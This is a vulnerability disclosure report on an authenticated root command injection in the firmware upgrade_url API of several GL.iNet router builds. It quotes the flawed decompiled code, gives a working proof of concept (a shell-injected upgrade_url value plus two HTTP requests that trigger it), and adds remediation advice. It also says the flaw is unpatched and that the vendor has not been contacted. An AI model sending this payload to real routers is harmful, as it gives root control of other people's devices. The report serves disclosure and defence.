# GL.iNet AR150 3.216 was discovered to contain an authenticated command injection vulnerability in the firmware upgrade URL

## Overview

- Vendor: GL.iNet
- Product: AR150 3.216, SF1200 3.218, S1300 3.218, USB150 3.218
- Version: 3.216 / 3.218
- Component: /www/api and /www/cgi-bin/api, /firmware/upgrade_url/set
- Vulnerability Class: CWE-78 command injection
- CVSS 3.1 (tentative): 7.3 High `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (administrator token required; command runs as root)
- Manufacturer: https://www.gl-inet.com/

## Affected versions

- AR150 `openwrt-ar150-3.216-0321-1679391237.bin`.
  `/www/api`
- SF1200 `openwrt-sf1200-3.218-0709-1720518095.bin`.
  `/www/api`
- S1300 `qsdk-s1300-3.218-0726-1721958248.img`.
  SquashFS at `0x3C137C`; `/www/cgi-bin/api`
- USB150 `openwrt-usb150-3.218-0709-1720515319.bin`.
  `/www/api`

## Vulnerability details

`POST /api/firmware/upgrade_url/set` stores the caller's `upgrade_url`
directly in UCI `glconfig.autoupdate.firmware_path` without validation:

```c
string = gjson_get_string(req, "upgrade_url");
guci2_set(..., "glconfig.autoupdate.firmware_path", string);
```

`cmm_get_frimware_url()` later returns that value to
`/firmware/onlinecheck` (`sub_17988`), which builds and executes:

```c
sprintf(cmd,
  "curl -f -Ls --connect-timeout 5 %s/list-sha256.txt -o /tmp/firmware_list",
  url);
execCommand(cmd);
```

and, after a successful check, `sub_17774`:

```c
sprintf(s, "curl -f -Ls --connect-timeout 5 %s/ReleaseNote.txt -o /tmp/firmware_release_note", url);
system(s);
sprintf(s, "curl -f -Ls --connect-timeout 5 %s/metadata_%s -o /tmp/firmware_metadata", url, version);
system(s);
```

The URL is unquoted, so a value containing `;`, `|`, newline, `$()` or
backticks is interpreted by `/bin/sh`. For example:

```text
http://127.0.0.1;id>/tmp/fw_url_pwn;#
```

turns the first command into:

```sh
curl ... http://127.0.0.1;id>/tmp/fw_url_pwn;#/list-sha256.txt -o /tmp/firmware_list
```

The `curl` attempt fails, then `id` runs. A local `/bin/sh` test of the
exact command created `/tmp/fw_url_pwn`.

The same strings (`/firmware/upgrade_url/set`, `ReleaseNote.txt`,
`list-sha256.txt`) and code paths are present in all four builds; only
addresses differ. The route is a normal authenticated POST entry, not
in the small no-auth table.

## PoC

```http
POST /api/firmware/upgrade_url/set HTTP/1.1
Host: <router>
Content-Type: application/json
Authorization: <valid admin token>

{"upgrade_url":"http://127.0.0.1;id>/tmp/fw_url_pwn;#"}
```

Then trigger the online check:

```http
POST /api/firmware/onlinecheck HTTP/1.1
Host: <router>
Content-Type: application/json
Authorization: <valid admin token>

{}
```

Check the marker:

```sh
cat /tmp/fw_url_pwn
```

## Evidence

Static IDA decompilation, setter, shell test and hashes:

`experiments/vulnerability-triage/results/20261108-glinet-upgrade-url-cmdi-01/evidence/`

- `static-s1300-upgrade_url-setter.txt` — `/firmware/upgrade_url/set`
  stores the URL without validation.
- `static-s1300-sub_17988.txt` — `/firmware/onlinecheck` builds
  `curl ... %s/list-sha256.txt`.
- `static-s1300-sub_17774.txt` — `ReleaseNote.txt`/metadata `curl`
  commands with `system()`.
- `cmd.txt`, `result.txt` — local `/bin/sh` test of the exact generated
  command; marker created.

No live router was used; this is static plus local shell semantics.

## Impact

An authenticated administrator (or anyone with a stolen token) can
execute arbitrary commands as root by setting a firmware URL and
triggering an online check. The firmware-update feature is normally
available to the admin UI; the URL is not constrained to HTTP(S) or
escaped.

## Remediation / known-CVE relation

- Validate `upgrade_url` as a strict `http://`/`https://` URL and reject
  whitespace, quotes, `;`, `|`, `$`, backticks and newline.
- Do not build shell commands from the URL; use an argv-based `curl`
  invocation and quote the URL.
- NVD keyword searches for `GL.iNet upgrade_url`, `firmware_path`,
  `ReleaseNote.txt` and `GL.iNet onlinecheck` returned zero results on
  2026-11-08. CVE-2023-31474/31471 are package-install injection issues;
  CVE-2024-39226/39228 are different s2s/OVPN shell injections.
  Candidate 0-day; no CVE assigned and no vendor contact has been made.

## Additional Information

```markdown
### Vendor
GL.iNet

### Product
AR150 3.216, SF1200 3.218, S1300 3.218, USB150 3.218

### Version or Commit
3.216 / 3.218

### Vulnerability Class
CWE-78 command injection

### Description
POST /api/firmware/upgrade_url/set stores upgrade_url in UCI glconfig.autoupdate.firmware_path without validation. The stored value is later used in a shell command, allowing an authenticated attacker to execute commands.

### Affected_component
/www/api and /www/cgi-bin/api, /firmware/upgrade_url/set

### Attack_vector
Authenticated JSON POST to /api/firmware/upgrade_url/set with a crafted upgrade_url.

### Product_version
AR150 3.216, SF1200 3.218, S1300 3.218, USB150 3.218 3.216 / 3.218

### Reference
- https://www.gl-inet.com/
- https://github.com/vuln-1/vuln/blob/main/GL.iNet/AR150_V3.216/report-3.md
```
